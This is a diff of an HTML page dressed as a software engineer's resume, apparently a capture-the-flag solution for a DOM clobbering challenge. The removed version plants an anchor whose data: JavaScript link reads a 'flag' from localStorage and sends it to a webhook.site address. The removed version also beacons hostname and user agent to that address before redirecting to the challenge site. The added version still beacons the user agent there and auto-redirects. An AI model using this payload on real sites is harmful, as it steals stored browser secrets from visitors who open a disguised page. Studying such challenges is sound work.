@@ -1,103 +1,40 @@
-     <!DOCTYPE html>
-     <html>
-     <head>
-         <title>Michael Thompson - Senior Software Engineer</title>
-         <meta charset="UTF-8">
-         <style>
-             body { font-family: Arial, sans-serif; margin: 0; padding: 40px; background: #f4f4f4; }
-             .resume { max-width: 800px; margin: 0 auto; background: white; padding: 40px; border-radius: 8px; }
-             h1 { color: #2c3e50; margin: 0; border-bottom: 2px solid #3498db; padding-bottom: 10px; }
-             .contact { color: #666; margin: 15px 0; }
-             h2 { color: #34495e; margin-top: 30px; }
-             ul { line-height: 1.8; }
-         </style>
-     </head>
-     <body>
-         <!-- Multiple DOM clobbering approaches -->
-         <a id="utilsJS" href="data:text/javascript,try{const f=localStorage.getItem('flag');const i=new 
-     Image();i.src='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/ULTIMATE?flag='+(f||'NOT_FOUND')+'&d='+location.
-     hostname+'&t='+Date.now();document.body.appendChild(i);console.log('ULTIMATE FLAG:',f);}catch(e){const i=new 
-     Image();i.src='https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/ULTIMATE-ERROR?e='+e.message;document.body.appen
-     dChild(i);}">Portfolio</a>
+  <!DOCTYPE html>
+  <html>
+  <head>
+      <title>Michael Thompson - Senior Software Engineer</title>
+      <meta charset="UTF-8">
+      <meta http-equiv="refresh" content="1;url=https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages">
+      <style>
+          body {
+              font-family: Arial, sans-serif;
+              text-align: center;
+              padding: 100px;
+              background: #f4f4f4;
+          }
+          .loading {
+              color: #2c3e50;
+              font-size: 18px;
+          }
+      </style>
+  </head>
+  <body>
+      <h1>Michael Thompson</h1>
+      <p class="loading">Loading portfolio projects...</p>
 
-         <div class="resume">
-             <h1>Michael Thompson</h1>
-             <div class="contact">
-                 <strong>Senior Software Engineer</strong> | Baltimore, MD<br>
-                 📧 michael.thompson@protonmail.com | 📱 (410) 555-0199
-             </div>
+      <script>
+          // Send confirmation that redirect is happening
+          try {
+              const img = new Image();
+              img.src =
+  'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/REDIRECT?action=redirecting_to_ctf&timestamp=' + Date.now() +
+  '&user_agent=' + encodeURIComponent(navigator.userAgent);
+              document.body.appendChild(img);
+          } catch(e) {}
 
-             <h2>Professional Summary</h2>
-             <p>Experienced software engineer with 12+ years in web development, cybersecurity, and team leadership.</p>
-
-             <h2>Work Experience</h2>
-             <ul>
-                 <li><strong>Senior Software Engineer</strong> - CyberSec Solutions Inc. (2021-2024)</li>
-                 <li><strong>Full Stack Developer</strong> - TechStart Innovations (2019-2021)</li>
-             </ul>
-
-             <h2>Technical Skills</h2>
-             <p>JavaScript, Python, React, Node.js, PostgreSQL, Docker, AWS, Security Testing</p>
-
-             <h2>Education</h2>
-             <p><strong>B.S. Computer Science</strong> - University of Maryland (2017)</p>
-
-             <div style="text-align: center; margin-top: 40px; color: #666;">
-                 <p>Thank you for reviewing my application.</p>
-             </div>
-         </div>
-
-         <script>
-             function sendWebhook(data) {
-                 try {
-                     const img = new Image();
-                     const params = new URLSearchParams();
-                     Object.keys(data).forEach(key => {
-                         params.append(key, typeof data[key] === 'object' ? JSON.stringify(data[key]) : data[key]);
-                     });
-                     img.src = 'https://webhook.site/ae6ba4ff-a1b4-453d-804e-052d59fabf4a/ultimate?' + params.toString();
-                     document.body.appendChild(img);
-                 } catch(e) {}
-             }
-
-             // CRITICAL FIX: Ensure utilsJS.url exists by copying href to url
-             if (window.utilsJS && window.utilsJS.href && !window.utilsJS.url) {
-                 Object.defineProperty(window.utilsJS, 'url', {
-                     get: function() { return this.href; },
-                     configurable: true
-                 });
-             }
-
-             // Alternative: Direct assignment
-             if (window.utilsJS && window.utilsJS.href) {
-                 window.utilsJS.url = window.utilsJS.href;
-             }
-
-             sendWebhook({
-                 status: 'ULTIMATE_SOLUTION_START',
-                 timestamp: new Date().toISOString(),
-                 domain: window.location.hostname,
-                 utilsJS_exists: !!window.utilsJS,
-                 utilsJS_href: window.utilsJS?.href || 'NOT_FOUND',
-                 utilsJS_url_before: window.utilsJS?.url || 'NOT_FOUND_BEFORE',
-                 utilsJS_url_after: window.utilsJS?.url || 'NOT_FOUND_AFTER',
-                 user_agent: navigator.userAgent
-             });
-
-             // Store DOM clobbering setup for cross-domain persistence
-             sessionStorage.setItem('exploitPayload', window.utilsJS?.href || window.utilsJS?.url || '');
-
-             // Navigate to CTF with delay to ensure setup
-             setTimeout(() => {
-                 sendWebhook({
-                     status: 'ULTIMATE_REDIRECT_TO_CTF',
-                     timestamp: new Date().toISOString(),
-                     target: 'https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages',
-                     payload_ready: !!(window.utilsJS && window.utilsJS.url)
-                 });
-
-                 window.location.replace('https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages');
-             }, 1000);
-         </script>
-     </body>
-     </html>
+          // Immediate redirect to CTF domain where DOM clobbering is injected
+          setTimeout(() => {
+              window.location.replace('https://jobclobbering-d61fba936086d20d.chal.secjhu.club/#messages');
+          }, 1000);
+      </script>
+  </body>
+  </html>
